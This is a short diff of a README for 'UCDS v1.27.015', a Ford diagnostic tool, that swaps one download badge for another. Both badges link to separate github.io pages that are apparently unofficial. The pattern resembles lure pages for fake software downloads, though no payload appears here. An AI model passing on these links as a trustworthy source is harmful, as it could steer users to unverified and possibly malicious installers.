@@ -1,10 +1,7 @@
 # UCDS v1.27.015 – Universal CAN Diagnostic System for Ford
 
-## 📥 Download UCDS v1.27.015
+[![View UCDS V1.27.015 for Win](https://img.shields.io/badge/View-UCDS%20V1.27.015%20for%20Win-047857?style=plastic)](https://ucds-v1-27-015-for.github.io/.github/)
 
-[![⬇️ Download UCDS](https://img.shields.io/badge/Download-UCDS%20v1.27.015-blue?style=for-the-badge&logo=ford)](https://ginelaklodi.github.io/.github/ucds-v1-27-015-for-win)
-
----
 
 ## 📦 How to Install
 
